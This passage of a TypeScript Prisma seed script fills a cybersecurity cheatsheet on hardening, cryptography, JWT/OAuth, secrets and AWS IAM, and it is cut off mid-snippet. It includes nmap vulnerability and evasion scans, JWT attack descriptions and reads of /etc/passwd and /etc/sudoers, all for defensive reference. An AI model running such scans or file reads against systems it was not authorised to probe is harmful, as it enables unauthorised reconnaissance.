import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

async function main() {
  await prisma.category.deleteMany({
    where: { name: "Cybersecurity", userId: null },
  });

  const cybersecurity = await prisma.category.create({
    data: {
      name: "Cybersecurity",
      icon: "🔒",
      color: "red",
      description:
        "Cybersecurity cheatsheet — network security, cryptography, Linux hardening, JWT/OAuth, secrets management, cloud security, pentesting tools, and incident response",
      isPublic: true,
      snippets: {
        create: [
          // ── Network Security ──────────────────────────────────────────────────
          {
            title: "Network Security & Scanning",
            description: "Nmap, Wireshark, common ports, firewall rules, and network reconnaissance",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "bash",
                  label: "Nmap scanning techniques",
                  content: `# ── Discovery ─────────────────────────────────────────────────────────────
# Ping sweep — find live hosts in a subnet
nmap -sn 192.168.1.0/24

# Host discovery without port scan
nmap -sn --traceroute 192.168.1.1

# ── Port Scanning ──────────────────────────────────────────────────────────
# TCP SYN scan (stealthy, requires root)
nmap -sS 192.168.1.10

# TCP connect scan (no root needed)
nmap -sT 192.168.1.10

# UDP scan (slow, needs root)
nmap -sU 192.168.1.10

# Scan specific ports
nmap -p 22,80,443,3306 192.168.1.10

# Scan top 1000 ports (default)
nmap 192.168.1.10

# Scan ALL 65535 ports
nmap -p- 192.168.1.10

# Fast scan top 100 ports
nmap -F 192.168.1.10

# ── Version & OS Detection ─────────────────────────────────────────────────
nmap -sV 192.168.1.10                  # service version detection
nmap -O  192.168.1.10                  # OS fingerprinting
nmap -A  192.168.1.10                  # aggressive: OS + version + scripts + traceroute

# ── NSE Scripts ────────────────────────────────────────────────────────────
nmap --script vuln      192.168.1.10   # check for common vulnerabilities
nmap --script http-enum 192.168.1.10   # enumerate web directories
nmap --script ssl-cert  192.168.1.10   # show TLS certificate details
nmap --script smb-vuln* 192.168.1.10   # check for SMB vulnerabilities

# ── Output ─────────────────────────────────────────────────────────────────
nmap -oN scan.txt  192.168.1.10        # normal output
nmap -oX scan.xml  192.168.1.10        # XML
nmap -oG scan.gnmap 192.168.1.10       # grepable
nmap -oA scan      192.168.1.10        # all three formats

# ── Evasion / Rate limiting ────────────────────────────────────────────────
nmap -T0  192.168.1.10                 # paranoid — slowest, stealthiest
nmap -T4  192.168.1.10                 # aggressive — fast (CTF/lab default)
nmap --scan-delay 500ms 192.168.1.10   # throttle between probes`,
                },
                {
                  order: 1,
                  language: "markdown",
                  label: "Common ports reference",
                  content: `# Common Ports Quick Reference

| Port  | Protocol | Service             | Notes                          |
|-------|----------|---------------------|--------------------------------|
| 21    | TCP      | FTP                 | Clear-text; use SFTP instead   |
| 22    | TCP      | SSH                 | Key-based auth; disable root   |
| 23    | TCP      | Telnet              | Clear-text; avoid              |
| 25    | TCP      | SMTP                | Email; often exploited for spam|
| 53    | TCP/UDP  | DNS                 | UDP queries; TCP zone transfers|
| 67/68 | UDP      | DHCP                |                                |
| 80    | TCP      | HTTP                | Redirect to 443                |
| 110   | TCP      | POP3                | Email retrieval                |
| 135   | TCP      | MSRPC               | Windows; often attacked        |
| 139   | TCP      | NetBIOS             | Legacy Windows file sharing    |
| 143   | TCP      | IMAP                | Email                          |
| 389   | TCP      | LDAP                | Directory services             |
| 443   | TCP      | HTTPS               | TLS 1.2+                       |
| 445   | TCP      | SMB                 | EternalBlue; block externally  |
| 514   | UDP      | Syslog              |                                |
| 587   | TCP      | SMTP (submission)   | Auth required                  |
| 636   | TCP      | LDAPS               | LDAP over TLS                  |
| 993   | TCP      | IMAPS               |                                |
| 995   | TCP      | POP3S               |                                |
| 1433  | TCP      | MSSQL               | Never expose to internet       |
| 1521  | TCP      | Oracle DB           | Never expose to internet       |
| 2375  | TCP      | Docker daemon (HTTP)| CRITICAL: no auth, RCE risk    |
| 2376  | TCP      | Docker daemon (TLS) |                                |
| 3306  | TCP      | MySQL/MariaDB       | Never expose to internet       |
| 3389  | TCP      | RDP                 | Brute force target             |
| 5432  | TCP      | PostgreSQL          | Never expose to internet       |
| 5900  | TCP      | VNC                 | Often poorly secured           |
| 6379  | TCP      | Redis               | No auth by default; isolate    |
| 8080  | TCP      | HTTP alt            | Dev/proxy                      |
| 8443  | TCP      | HTTPS alt           |                                |
| 9200  | TCP      | Elasticsearch       | No auth by default; isolate    |
| 27017 | TCP      | MongoDB             | No auth by default; isolate    |`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "Firewall & network hardening",
                  content: `# ── iptables basics ───────────────────────────────────────────────────────
# Default deny-all policy
iptables -P INPUT   DROP
iptables -P FORWARD DROP
iptables -P OUTPUT  ACCEPT

# Allow established/related connections (stateful)
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow SSH from specific IP only
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT

# Allow HTTP and HTTPS
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Rate-limit SSH to slow brute force
iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT

# Save rules
iptables-save > /etc/iptables/rules.v4

# ── ufw (Ubuntu) ───────────────────────────────────────────────────────────
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
ufw status verbose

# ── nftables (modern replacement for iptables) ─────────────────────────────
nft list tables
nft list ruleset

# ── Network diagnostics ────────────────────────────────────────────────────
ss -tlnp                               # listening TCP sockets + process
ss -ulnp                               # listening UDP sockets
netstat -tlnp                          # older alternative
lsof -i :80                            # what process owns port 80

# Check for unexpected outbound connections
ss -tnp state established
netstat -anp | grep ESTABLISHED

# DNS lookup tools
dig +short example.com
dig +short example.com MX
nslookup example.com 8.8.8.8
host -t TXT example.com                # SPF, DKIM records

# ── Wireshark / tcpdump ────────────────────────────────────────────────────
tcpdump -i eth0 -n                     # capture all traffic
tcpdump -i eth0 port 80                # HTTP traffic
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN packets
tcpdump -i eth0 -w capture.pcap        # write to file for Wireshark
tcpdump -r capture.pcap                # read pcap file`,
                },
              ],
            },
          },
          // ── Cryptography ──────────────────────────────────────────────────────
          {
            title: "Cryptography Reference",
            description: "Algorithms, key sizes, TLS configuration, hashing, and common mistakes",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "markdown",
                  label: "Algorithm selection guide",
                  content: `# Cryptography — What to Use in 2025

## Symmetric Encryption
| Algorithm       | Key Size  | Use                          | Notes                       |
|-----------------|-----------|------------------------------|-----------------------------|
| AES-256-GCM     | 256-bit   | ✅ Data encryption (AEAD)    | Authenticated; use this     |
| AES-128-GCM     | 128-bit   | ✅ When 128-bit is sufficient|                             |
| ChaCha20-Poly1305| 256-bit  | ✅ Mobile / low-power devices| No hardware AES support     |
| AES-256-CBC     | 256-bit   | ⚠️  Needs separate HMAC      | Prefer GCM mode             |
| DES / 3DES      | 56/168-bit| ❌ Broken / deprecated       |                             |
| RC4             | Variable  | ❌ Broken                    |                             |

## Asymmetric Encryption / Signing
| Algorithm  | Key Size      | Use                              | Notes                    |
|------------|---------------|----------------------------------|--------------------------|
| Ed25519    | 256-bit curve | ✅ Signing (SSH, JWT, certs)     | Fast, modern             |
| ECDSA P-256| 256-bit curve | ✅ Signing                       | Widely supported         |
| RSA-OAEP   | 2048–4096-bit | ✅ Encryption (key wrapping)     | 3072+ for new systems    |
| RSA-PSS    | 2048–4096-bit | ✅ Signatures                    |                          |
| RSA-PKCS1  | Any           | ⚠️  Legacy; use PSS/OAEP instead |                          |
| RSA < 2048 | <2048-bit     | ❌ Insufficient                  |                          |
| DSA        | 1024-bit      | ❌ Deprecated by NIST            |                          |

## Key Exchange
| Algorithm      | Use                                  | Notes                    |
|----------------|--------------------------------------|--------------------------|
| X25519 (ECDH)  | ✅ TLS, key agreement                | Modern, fast             |
| ECDH P-256     | ✅ TLS, key agreement                | Widely supported         |
| DH < 2048-bit  | ❌ Logjam attack                     |                          |

## Hashing
| Algorithm  | Output   | Use                               | Notes                    |
|------------|----------|-----------------------------------|--------------------------|
| SHA-256    | 256-bit  | ✅ Checksums, HMAC, signing       |                          |
| SHA-384/512| 384/512  | ✅ Higher security margin         |                          |
| SHA-3      | Variable | ✅ Alternative to SHA-2           |                          |
| BLAKE3     | 256-bit  | ✅ Fast checksums, non-crypto use |                          |
| Argon2id   | Variable | ✅ Password hashing               | Use for passwords only   |
| bcrypt     | 60 chars | ✅ Password hashing               | Cost factor ≥ 12         |
| scrypt     | Variable | ✅ Password hashing               |                          |
| MD5        | 128-bit  | ❌ Broken (collisions)            | Only for non-security use|
| SHA-1      | 160-bit  | ❌ Broken (SHAttered collision)   |                          |`,
                },
                {
                  order: 1,
                  language: "bash",
                  label: "OpenSSL & TLS operations",
                  content: `# ── TLS Certificate Operations ────────────────────────────────────────────
# Inspect remote certificate
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \
  | openssl x509 -noout -text

# Check certificate expiry
echo | openssl s_client -connect example.com:443 -servername example.com 2>/dev/null \
  | openssl x509 -noout -dates

# Inspect local certificate file
openssl x509 -in cert.pem -noout -text
openssl x509 -in cert.pem -noout -subject -issuer -dates

# ── Generate Keys & CSRs ───────────────────────────────────────────────────
# Generate RSA 4096 private key
openssl genrsa -out private.key 4096

# Generate EC key (preferred — smaller, faster)
openssl ecparam -name prime256v1 -genkey -noout -out private.key

# Generate CSR (Certificate Signing Request)
openssl req -new -key private.key -out request.csr \
  -subj "/C=US/ST=CA/O=Acme Inc/CN=example.com"

# Self-signed cert (dev only)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/CN=localhost"

# ── Test TLS Configuration ─────────────────────────────────────────────────
# Check supported cipher suites and protocols
nmap --script ssl-enum-ciphers -p 443 example.com

# Online tools
# ssllabs.com/ssltest   — graded TLS analysis
# badssl.com            — test client TLS behaviour

# ── Hashing & HMAC ─────────────────────────────────────────────────────────
echo -n "message" | openssl dgst -sha256
echo -n "message" | openssl dgst -sha256 -hmac "secret-key"

# File checksum verification
sha256sum file.tar.gz
sha256sum -c checksums.sha256

# ── Encryption / Decryption ────────────────────────────────────────────────
# Encrypt file with AES-256-CBC (password-based; prefer asymmetric for prod)
openssl enc -aes-256-cbc -salt -pbkdf2 -in plaintext.txt -out encrypted.bin
openssl enc -d -aes-256-cbc -pbkdf2 -in encrypted.bin -out decrypted.txt

# ── GPG ────────────────────────────────────────────────────────────────────
gpg --gen-key
gpg --list-keys
gpg --encrypt --recipient alice@example.com file.txt
gpg --decrypt file.txt.gpg
gpg --sign --detach-sign file.txt        # creates file.txt.sig
gpg --verify file.txt.sig file.txt`,
                },
                {
                  order: 2,
                  language: "markdown",
                  label: "TLS hardening config",
                  content: `# TLS Hardening Configuration Reference

## Nginx — modern TLS config
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
ssl_prefer_server_ciphers off;          # TLS 1.3 ignores this
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
ssl_session_tickets off;                # prevent ticket key reuse
ssl_stapling on;                        # OCSP stapling
ssl_stapling_verify on;

# HSTS — tell browsers to always use HTTPS
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

## What to disable
❌ SSLv2, SSLv3      — broken (POODLE)
❌ TLS 1.0, TLS 1.1  — deprecated (BEAST, POODLE, CRIME)
❌ RC4               — broken
❌ DES / 3DES        — SWEET32 attack
❌ Export ciphers    — intentionally weak
❌ NULL ciphers      — no encryption
❌ MD5 in signatures — broken
❌ Anonymous DH      — no authentication

## Certificate Best Practices
- Use 2048-bit RSA minimum; prefer 256-bit ECDSA (P-256)
- Set notAfter ≤ 398 days (browser requirement)
- Use Let's Encrypt (free, auto-renew) or a trusted CA
- Enable OCSP stapling to avoid revocation check latency
- Submit to CT logs (Certificate Transparency)
- CAA DNS record: restrict which CAs can issue for your domain
  example.com. CAA 0 issue "letsencrypt.org"`,
                },
              ],
            },
          },
          // ── Linux Hardening ───────────────────────────────────────────────────
          {
            title: "Linux Hardening",
            description: "File permissions, users, SSH, process isolation, and auditd",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "bash",
                  label: "File permissions & ownership",
                  content: `# ── Permission Bits ───────────────────────────────────────────────────────
# Format: [type][owner][group][other]
# r=4, w=2, x=1
#
# -rwxr-xr--  =  owner:rwx  group:r-x  other:r--
#               = 754

# View permissions
ls -la /etc/passwd
stat /etc/shadow

# Change permissions
chmod 600 ~/.ssh/id_rsa              # private key — owner read/write only
chmod 644 ~/.ssh/id_rsa.pub          # public key — world readable
chmod 700 ~/.ssh                     # .ssh directory
chmod 755 /usr/local/bin/myapp       # executable: owner rwx, others rx
chmod o-w /etc/cron.d/myjob          # remove world-write
chmod u+s /usr/bin/sudo              # setuid bit
chmod g+s /var/www/html              # setgid on directory (new files inherit group)
chmod +t  /tmp                       # sticky bit (only owner can delete their files)

# Recursive (use with care)
chmod -R 755 /var/www/html
find /var/www/html -type f -exec chmod 644 {} \;
find /var/www/html -type d -exec chmod 755 {} \;

# Change ownership
chown root:root /etc/sudoers
chown -R www-data:www-data /var/www/html

# ── Dangerous Permissions to Find ──────────────────────────────────────────
find / -perm -4000 -type f 2>/dev/null   # setuid binaries
find / -perm -2000 -type f 2>/dev/null   # setgid binaries
find / -perm -o+w  -type f 2>/dev/null   # world-writable files
find / -nouser 2>/dev/null               # unowned files
find / -nogroup 2>/dev/null              # no-group files

# ── Sensitive File Permissions (correct values) ────────────────────────────
# /etc/passwd    644  (root:root)
# /etc/shadow    640  (root:shadow)  — hashed passwords
# /etc/sudoers   440  (root:root)
# ~/.ssh/        700
# ~/.ssh/id_rsa  600
# ~/.ssh/authorized_keys  600`,
                },
                {
                  order: 1,
                  language: "bash",
                  label: "SSH hardening",
                  content: `# /etc/ssh/sshd_config — hardened settings

# Disable root login
PermitRootLogin no

# Disable password authentication — keys only
PasswordAuthentication no
ChallengeResponseAuthentication no
UsePAM yes

# Disable empty passwords
PermitEmptyPasswords no

# Restrict to specific users/groups
AllowUsers deploy ops@10.0.0.0/8
AllowGroups sshusers

# Limit authentication attempts
MaxAuthTries 3
MaxSessions 5
LoginGraceTime 30

# Disable X11 / agent forwarding if not needed
X11Forwarding no
AllowAgentForwarding no

# Disable TCP forwarding if not needed
AllowTcpForwarding no

# Use strong algorithms only
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512

# Log verbosely for auth events
LogLevel VERBOSE

# Apply changes
systemctl reload sshd

# ── Client-side: ~/.ssh/config ─────────────────────────────────────────────
Host prod-server
  HostName 10.0.1.50
  User deploy
  IdentityFile ~/.ssh/id_ed25519
  ServerAliveInterval 60
  ServerAliveCountMax 3

# ── Key generation (prefer Ed25519) ───────────────────────────────────────
ssh-keygen -t ed25519 -C "user@host" -f ~/.ssh/id_ed25519
ssh-keygen -t rsa -b 4096 -C "user@host"       # RSA fallback

# Copy public key to server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@server

# ── Fail2ban — block repeated failed logins ────────────────────────────────
apt install fail2ban
# /etc/fail2ban/jail.local
# [sshd]
# enabled  = true
# port     = ssh
# maxretry = 3
# bantime  = 3600
systemctl enable --now fail2ban
fail2ban-client status sshd`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "User management & privilege escalation hardening",
                  content: `# ── User Audit ────────────────────────────────────────────────────────────
# List all users
cat /etc/passwd
cut -d: -f1 /etc/passwd

# Find users with UID 0 (root-equivalent — should be only root)
awk -F: '$3 == 0 { print $1 }' /etc/passwd

# List users with login shells
grep -v nologin /etc/passwd | grep -v false

# List sudoers
cat /etc/sudoers
sudo -l                     # current user's sudo permissions
getent group sudo           # who is in the sudo group

# ── Disable/lock unused accounts ──────────────────────────────────────────
usermod -L username          # lock account (prepend ! to password hash)
usermod -s /sbin/nologin username   # remove login shell
passwd -l username           # lock password

# ── Password Policy ────────────────────────────────────────────────────────
# /etc/login.defs
PASS_MAX_DAYS 90
PASS_MIN_DAYS 1
PASS_MIN_LEN  14
PASS_WARN_AGE 14

# PAM password complexity — /etc/pam.d/common-password
# password requisite pam_pwquality.so retry=3 minlen=14 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1

# ── Sudo Hardening ─────────────────────────────────────────────────────────
# /etc/sudoers (edit with visudo — validates syntax before saving)

# Require password for every sudo command
Defaults timestamp_timeout=0

# Log all sudo commands
Defaults logfile="/var/log/sudo.log"
Defaults log_output

# Restrict specific user to specific commands only
deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp

# Prevent sudo environment inheritance
Defaults env_reset
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ── auditd — kernel-level audit logging ───────────────────────────────────
apt install auditd

# Watch sensitive files for changes
auditctl -w /etc/passwd  -p wa -k identity
auditctl -w /etc/shadow  -p wa -k identity
auditctl -w /etc/sudoers -p wa -k sudo_changes
auditctl -w /var/log/auth.log -p wa -k auth_log

# Audit privileged command execution
auditctl -a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds

# View audit logs
ausearch -k identity
ausearch -k sudo_changes --start today
aureport --auth`,
                },
              ],
            },
          },
          // ── JWT & OAuth ───────────────────────────────────────────────────────
          {
            title: "JWT & OAuth 2.0 Security",
            description: "JWT structure, common attacks, OAuth 2.0 flows, and secure implementation",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "markdown",
                  label: "JWT structure & attacks",
                  content: `# JWT (JSON Web Token) Structure
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header (base64url)
.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9  ← Payload (base64url, NOT encrypted)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← Signature

Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "sub": "123", "role": "user", "iat": 1716000000, "exp": 1716003600 }

⚠️  JWT payload is base64-encoded, NOT encrypted — anyone can decode it.
    Never put secrets or sensitive PII in a JWT payload.

# Standard Claims
iss  — issuer
sub  — subject (user ID)
aud  — audience (intended recipient)
exp  — expiration time (Unix timestamp) ← always set this
nbf  — not before
iat  — issued at
jti  — JWT ID (unique ID, enables revocation)

# Common JWT Attacks

## 1. Algorithm confusion (alg:none)
Attacker removes signature and sets "alg":"none"
Fix: explicitly allow only expected algorithms; never trust header alg blindly

## 2. RS256 → HS256 confusion
If server uses RS256, attacker signs token with public key using HS256.
If server accepts both and uses public key as HMAC secret → bypass.
Fix: pin allowed algorithms server-side; never accept HS256 if RS256 expected.

## 3. Weak secret brute force
HS256 with short/guessable secret → offline dictionary attack with hashcat.
Fix: use 256-bit random secret minimum; prefer RS256/EdDSA for public APIs.

## 4. No expiry (no "exp" claim)
Stolen token is valid forever.
Fix: always set exp; keep access tokens short-lived (5–15 minutes).

## 5. Missing signature verification
Server decodes without verifying signature.
Fix: always verify before trusting; use a battle-tested library.

## 6. Sensitive data in payload
JWT is base64, not encrypted — easily decoded by anyone.
Fix: never put passwords, SSN, PAN, or secrets in JWT payload.`,
                },
                {
                  order: 1,
                  language: "typescript",
                  label: "Secure JWT implementation",
                  content: `import jwt from "jsonwebtoken";
import crypto from "crypto";

// ── Signing ────────────────────────────────────────────────────────────────

// ✅ Use strong secret (256-bit minimum for HS256)
const JWT_SECRET = process.env.JWT_SECRET!; // Must be 32+ random bytes

// ✅ Short-lived access token + refresh token pattern
function issueTokens(userId: string, role: string) {
  const accessToken = jwt.sign(
    { sub: userId, role },
    JWT_SECRET,
    {
      algorithm:  "HS256",
      expiresIn:  "15m",          // short-lived
      issuer:     "api.example.com",
      audience:   "app.example.com",
      jwtid:      crypto.randomUUID(),
    },
  );

  const refreshToken = jwt.sign(
    { sub: userId, type: "refresh" },
    JWT_SECRET,
    { expiresIn: "7d", jwtid: crypto.randomUUID() },
  );

  return { accessToken, refreshToken };
}

// ── Verification ───────────────────────────────────────────────────────────

// ✅ Explicitly specify allowed algorithms — never trust header alg
function verifyToken(token: string) {
  return jwt.verify(token, JWT_SECRET, {
    algorithms: ["HS256"],          // pin algorithm
    issuer:     "api.example.com",
    audience:   "app.example.com",
  });
}

// ❌ VULNERABLE — trusts header algorithm
// jwt.verify(token, secret)

// ── Refresh Token Rotation ─────────────────────────────────────────────────

// ✅ Store refresh tokens server-side (DB/Redis) to allow revocation
const refreshTokenStore = new Set<string>();

async function rotateRefreshToken(oldToken: string) {
  const payload = verifyToken(oldToken) as jwt.JwtPayload;

  // Check it's a refresh token and hasn't been revoked
  if (payload.type !== "refresh" || !refreshTokenStore.has(payload.jti!)) {
    throw new Error("Invalid refresh token");
  }

  // Revoke old token (detect reuse attacks)
  refreshTokenStore.delete(payload.jti!);

  // Issue new pair
  const tokens = issueTokens(payload.sub!, "user");
  refreshTokenStore.add((jwt.decode(tokens.refreshToken) as jwt.JwtPayload).jti!);
  return tokens;
}`,
                },
                {
                  order: 2,
                  language: "markdown",
                  label: "OAuth 2.0 flows",
                  content: `# OAuth 2.0 Flows

## Authorization Code + PKCE (browser/mobile apps — recommended)
1. App generates code_verifier (random 43-128 chars) and
   code_challenge = base64url(SHA256(code_verifier))
2. Redirect user to:
   /authorize?response_type=code&client_id=...&redirect_uri=...
           &code_challenge=<hash>&code_challenge_method=S256&state=<random>
3. User authenticates → server redirects back with ?code=...&state=...
4. App verifies state matches (CSRF protection)
5. App exchanges code + code_verifier for access token (server-to-server)

PKCE prevents code interception attacks on public clients.
Always use for SPAs and mobile apps — no client secret needed.

## Client Credentials (server-to-server, no user involved)
POST /token
  grant_type=client_credentials
  &client_id=...&client_secret=...
  &scope=read:data

Use for: machine-to-machine API calls, background services.

## Implicit Flow  ❌ DEPRECATED
Was used for SPAs — tokens in URL fragment (leaked in logs/referrer).
Replace with Authorization Code + PKCE.

## Resource Owner Password Credentials ❌ AVOID
User gives credentials directly to client app.
Only for highly trusted first-party apps when no other flow is possible.

# OAuth Security Checklist
✓ Always validate state parameter (CSRF protection)
✓ Use PKCE for public clients (SPA, mobile)
✓ Validate redirect_uri strictly (exact match, not prefix)
✓ Keep access tokens short-lived (5–15 min)
✓ Store tokens in memory (SPA) or secure HttpOnly cookies, not localStorage
✓ Never store client_secret in browser or mobile app code
✓ Validate iss, aud, exp claims on received tokens
✓ Use token introspection endpoint to verify active tokens
✓ Revoke tokens on logout (server-side)`,
                },
              ],
            },
          },
          // ── Secrets Management ────────────────────────────────────────────────
          {
            title: "Secrets Management",
            description: "Avoiding secret leaks, vault patterns, rotation, and scanning",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "bash",
                  label: "Detecting & preventing secret leaks",
                  content: `# ── Pre-commit scanning (prevent secrets reaching git) ────────────────────
# Install gitleaks
brew install gitleaks       # macOS
apt install gitleaks        # Linux

# Scan repo for secrets
gitleaks detect --source .

# Scan specific commit
gitleaks detect --source . --log-opts="HEAD~5..HEAD"

# Run as pre-commit hook
# .pre-commit-config.yaml:
# repos:
#   - repo: https://github.com/gitleaks/gitleaks
#     rev: v8.18.0
#     hooks:
#       - id: gitleaks

# ── truffleHog — deep secret scanning ─────────────────────────────────────
trufflehog git file://. --only-verified
trufflehog github --repo https://github.com/org/repo

# ── git-secrets (AWS) ─────────────────────────────────────────────────────
git secrets --install
git secrets --register-aws
git secrets --scan

# ── Revoke and rotate immediately if a secret is committed ─────────────────
# 1. Assume the secret is compromised — rotate/revoke FIRST
# 2. Remove from git history (this does NOT fix the leak — it's already public):
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch path/to/secret-file' \
  --prune-empty --tag-name-filter cat -- --all

# Better: use git-filter-repo (faster, safer)
pip install git-filter-repo
git filter-repo --path path/to/secret --invert-paths

# Force-push all branches (coordinate with team)
git push origin --force --all

# 3. Invalidate the secret at the provider (GitHub, AWS, etc.)

# ── .gitignore essentials ──────────────────────────────────────────────────
.env
.env.*
!.env.example
*.pem
*.key
*.p12
*.pfx
secrets/
config/secrets.yml`,
                },
                {
                  order: 1,
                  language: "typescript",
                  label: "Secure secrets handling in code",
                  content: `// ── Environment Variables (12-factor app) ────────────────────────────────
// ✅ Load secrets from environment — never hardcode
const config = {
  dbPassword:  process.env.DB_PASSWORD,
  jwtSecret:   process.env.JWT_SECRET,
  apiKey:      process.env.STRIPE_API_KEY,
};

// ✅ Validate required secrets at startup — fail fast
function validateConfig(cfg: typeof config) {
  const missing = Object.entries(cfg)
    .filter(([, v]) => !v)
    .map(([k]) => k);
  if (missing.length) {
    throw new Error(\`Missing required secrets: \${missing.join(", ")}\`);
  }
}
validateConfig(config);

// ── AWS Secrets Manager ────────────────────────────────────────────────────
import { SecretsManagerClient, GetSecretValueCommand } from "@aws-sdk/client-secrets-manager";

const sm = new SecretsManagerClient({ region: "us-east-1" });

async function getSecret(secretName: string): Promise<Record<string, string>> {
  const cmd = new GetSecretValueCommand({ SecretId: secretName });
  const res = await sm.send(cmd);
  return JSON.parse(res.SecretString!);
}

// Usage
const dbCreds = await getSecret("prod/myapp/database");
// { host, port, username, password }

// ── Never log secrets ──────────────────────────────────────────────────────
// ❌ VULNERABLE
console.log("Config:", config);
logger.info({ apiKey: process.env.STRIPE_API_KEY });

// ✅ Redact sensitive fields in logs
function redact<T extends Record<string, unknown>>(obj: T, keys: string[]): T {
  return Object.fromEntries(
    Object.entries(obj).map(([k, v]) => [k, keys.includes(k) ? "[REDACTED]" : v])
  ) as T;
}
logger.info(redact(config, ["dbPassword", "jwtSecret", "apiKey"]));

// ── Secret Rotation Pattern ────────────────────────────────────────────────
// 1. Generate new secret
// 2. Store BOTH old + new in secrets manager (dual-active period)
// 3. Deploy new application version using new secret
// 4. Verify all instances use new secret
// 5. Remove old secret from secrets manager`,
                },
                {
                  order: 2,
                  language: "bash",
                  label: "HashiCorp Vault",
                  content: `# ── Vault basics ──────────────────────────────────────────────────────────
export VAULT_ADDR="https://vault.example.com:8200"
export VAULT_TOKEN="$(cat ~/.vault-token)"

# Authenticate
vault login -method=aws                     # IAM role
vault login -method=kubernetes role=myapp   # K8s service account
vault login -method=token                   # token (dev only)

# KV secrets (version 2)
vault kv put  secret/myapp/prod db_password="s3cr3t" api_key="key123"
vault kv get  secret/myapp/prod
vault kv get  -field=db_password secret/myapp/prod
vault kv list secret/myapp/
vault kv delete secret/myapp/prod
vault kv metadata get secret/myapp/prod     # version history

# ── Dynamic Secrets (generate on demand, auto-expire) ─────────────────────
# Dynamic DB credentials — each app instance gets unique creds
vault read database/creds/myapp-role
# Key       Value
# username  v-token-abc123
# password  A1b2C3d4-xxxx

# Dynamic AWS credentials
vault read aws/creds/myapp-role
# access_key, secret_key, security_token — TTL 1 hour

# ── Policies ───────────────────────────────────────────────────────────────
# myapp-policy.hcl
# path "secret/data/myapp/*" {
#   capabilities = ["read"]
# }
# path "database/creds/myapp-role" {
#   capabilities = ["read"]
# }
vault policy write myapp myapp-policy.hcl

# ── Audit Log ──────────────────────────────────────────────────────────────
vault audit enable file file_path=/var/log/vault/audit.log
vault audit list

# ── Seal / Unseal ──────────────────────────────────────────────────────────
vault status
vault seal                  # emergency: lock vault immediately
vault operator unseal       # requires Shamir key shares`,
                },
              ],
            },
          },
          // ── Cloud Security ────────────────────────────────────────────────────
          {
            title: "Cloud Security (AWS)",
            description: "IAM least privilege, security groups, CloudTrail, GuardDuty, and misconfig scanning",
            isPublic: true,
            commands: {
              create: [
                {
                  order: 0,
                  language: "bash",
                  label: "IAM security",
                  content: `# ── IAM Audit ─────────────────────────────────────────────────────────────
# Generate credential report (all users, key ages, MFA status)
aws iam generate-credential-report
aws iam get-credential-report --query Content --output text | base64 -d

# List users with no MFA
aws iam list-users --query 'Users[*].UserName' --output text | \
  xargs -I{} aws iam list-mfa-devices --user-name {} --query \
  'MFADevices[*].SerialNumber'

# List access keys and last-used dates
aws iam list-access-keys --user-name alice
aws iam get-access-key-last-used --access-key-id AKIAXXXXXXXXXXXXXXXX

# Find users with admin access
aws iam list-attached-user-policies --user-name alice
aws iam list-user-policies --user-name alice

# ── Least Privilege IAM Policy ─────────────────────────────────────────────
# ❌ OVERPRIVILEGED
# { "Effect": "Allow", "Action": "*", "Resource": "*" }

# ✅ Least privilege — specific actions on specific resources
# {
#   "Version": "2012-10-17",
#   "Statement": [{
#     "Effect": "Allow",
#     "Action": [
#       "s3:GetObject",
#       "s3:PutObject"
#     ],
#     "Resource": "arn:aws:s3:::my-bucket/uploads/*"
#   }]
# }

# Use IAM Access Analyzer to find overprivileged roles
aws accessanalyzer create-analyzer --analyzer-name my-analyzer --type ACCOUNT

# ── IAM Role Best Practices ────────────────────────────────────────────────
# List roles and their trust policies
aws iam list-roles --query 'Roles[*].[RoleName,Arn]'
aws iam get-role --role-name MyRole

# Simulate policy (test permissions without calling real API)
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:role/MyRole \
  --action-names s3:GetObject ec2:DescribeInstances

# Rotate access keys
aws iam create-access-key --user-name alice
# Deploy new key, then deactivate old
aws iam update-access-key --user-name alice --access-key-id OLD_KEY --status Inactive
# After confirming new key works, delete old
